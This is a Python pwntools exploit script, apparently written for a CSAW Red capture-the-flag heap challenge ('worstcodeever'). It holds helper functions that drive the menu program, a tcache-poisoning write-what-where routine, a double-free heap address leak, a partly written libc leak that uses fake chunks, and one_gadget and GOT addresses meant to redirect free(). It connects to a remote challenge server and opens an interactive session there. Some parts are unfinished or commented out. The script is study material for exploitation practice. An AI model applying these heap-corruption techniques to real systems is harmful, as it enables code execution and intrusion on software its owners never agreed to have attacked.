#!/usr/bin/env python3

from pwn import *

exe = ELF("./worstcodeever")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe

""" Notes
sizeof(struct Friend) == 16
sizeof(union identifier) == 8
tcache is used when friends are freed

Write-What-Where Strategy:
-create an unwanted robot (to avoid "too few friends")
-create a robot
-free the robot
-edit the robot, setting barcode to `where`
-create another unwanted robot
-create another robot; it will be at `where`
-edit this robot, setting barcode to `what`
-you have written `what` to `where`

Leak Strategy:
-???
"""

def addfriend(human_name, name, age):#null human_name to leak
    assert human_name == b'' or int(human_name)
    assert len(name) < 64
    print(conn.recvuntil(b'> ').decode())
    print(b'1\n')
    conn.sendline(b'1')
    print(conn.recvuntil(b'?\n').decode())
    print(human_name+name+b'\n')
    conn.sendline(human_name+name)
    print(conn.recvuntil(b"?\n").decode())
    print(str(age).encode()+b'\n')
    conn.sendline(str(age).encode())

def addrobot(barcode, age):
    print(conn.recvuntil(b'> ').decode())
    print(b'1\n')
    conn.sendline(b'1')
    print(conn.recvuntil(b'?\n').decode())
    print(b'0\n')
    conn.sendline(b'0')
    print(conn.recvuntil(b"?\n").decode())
    print(str(barcode).encode()+b'\n')
    conn.sendline(str(barcode).encode())
    print(conn.recvuntil(b"?\n").decode())
    print(str(age).encode()+b'\n')
    conn.sendline(str(age).encode())

def free(index):
    print(conn.recvuntil(b'> ').decode())
    print(b'2\n')
    conn.sendline(b'2\n')
    print(conn.recvuntil(b'?\n'))
    print(str(index).encode()+b'\n')
    conn.sendline(str(index).encode())

def edit(index, newname_or_newbarcode, newage):
    if isinstance(newname_or_newbarcode,int):
        newname_or_newbarcode = str(newname_or_newbarcode).encode()
    else:
        assert len(newname_or_newbarcode) < 64
    print(conn.recvuntil(b'> ').decode())
    print(b'4\n')
    conn.sendline(b'4')
    print(conn.recvuntil(b'?\n'))
    print(str(index).encode()+b'\n')
    conn.sendline(str(index).encode())
    print(conn.recvuntil(b'?\n'))
    print(newname_or_newbarcode+b'\n')
    conn.sendline(newname_or_newbarcode)
    print(conn.recvuntil(b'?\n'))
    print(str(newage).encode()+b'\n')
    conn.sendline(str(newage).encode())

def show(index,kind='robot'):
    print(conn.recvuntil(b'> ').decode())
    print(b'3\n')
    conn.sendline(b'3')
    print(conn.recvuntil(b'\n').decode())
    print(str(index).encode()+b'\n')
    conn.sendline(str(index).encode())
    name = conn.recvline().split()[-1]
    if kind=='robot':
        print(kind)
        name = int(name)
    print(conn.recvuntil(b'age: ').decode()+conn.recvuntil(b'\n').decode())
    return name

if args.GDB:
    conn = process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    g = gdb.attach(conn, gdbscript=(''
         +'file worstcodeever\n'
         +'break display\n'
         +'commands\n'
         +'heap bins\n'#unfortunately this shows up before gef context
         +'end\n'
        #+'break add_friend\n'
        #+'break add_friend\n'
        #+'break remove_friend\n'
        #+'break edit_friend\n'
         +'c\n'#start automatically
        )
    )
elif args.LOCAL:
    conn = process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
else:
    conn = remote('pwn.red.csaw.io',5008)

def testwrappers():    
    addfriend(b'11',b'freddy',123)
    addrobot(1234567,80)
    show(0)
    show(1)
    edit(1, 987654, 90)
    show(1)
    edit(0, b'mercury', 321)
    show(0)
    free(1)
    show(1)
  
def writewhatwhere(where, what):
    addrobot(999,100) #create an unwanted robot (to avoid "too few friends")
    addrobot(101,200) #create a robot
    free(1)           #free the robot
    edit(1,where,300) #edit the robot, setting barcode to `where`
    addrobot(888,400) #create another unwanted robot
    addrobot(what,500)#create another robot; it will be at `where`; set its barcode to `what`
    #you have written `what` to `where`

def leak_heap_addr():
    addfriend(b'999',b'tony',128)#create an unwanted friend (to avoid "too few friends")
    addrobot(101,200)#create a robot
    show(1)
    free(1) #double free the robot
    free(1)
    heap_addr = show(1)
    print("Heap addr:",hex(heap_addr))
    return heap_addr

def leak_libc():
    free(1)
    free(1)
    addrobot(0,333)
    addrobot(333,321)
    fake_chunk = (p64(heap_addr)+p64(0x91))*3
    addfriend(b'1',fake_chunk,64)
    for i in range(8):
        pass

def teamrocket():
    addfriend(b'2',b'unwanted',2)
    addfriend(b'1',b'A'*0x29+p64(0)+p64(0x51),4)
    show(1)
    free(1)
    free(1)
    leak = show(1, kind='human')
    print('leak:',leak)

one_gadgets = [0x4f365,0x4f3c2,0x10a45c]
puts_gotplt = 0x00602020
free_gotplt = 0x00602018
play = 0x00400db8

#heap_addr = leak_heap_addr()
#libc_addr = leak_libc()
#writewhatwhere(heap_addr,u64(b'AAAABBBB'))
#writewhatwhere(free_gotplt,play)
teamrocket()
conn.interactive()

conn.close()



